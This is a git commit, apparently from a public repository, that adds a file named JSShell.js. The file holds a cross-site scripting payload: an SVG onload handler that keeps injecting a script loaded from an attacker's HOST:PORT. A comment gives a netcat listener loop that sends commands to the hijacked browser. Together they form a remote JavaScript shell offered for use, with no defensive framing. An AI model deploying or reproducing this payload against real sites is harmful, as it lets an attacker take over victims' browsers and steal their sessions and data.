b0e64d12de6ed6978e32fdb41cbd72530fca7ba9
Harusenpai <30319832+Harusenpai@users.noreply.github.com>
2018-11-28 16:07:29 -0300

    Add files via upload

---
+++ JSShell.js
@@ -0,0 +1,4 @@
+    // Send commands with
+    // while :; do printf "j$ "; read c; echo $c | nc -lp PORT >/dev/null; done
+    <svg/onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//HOST:PORT";d.body.appendChild(z)},0)>
+    
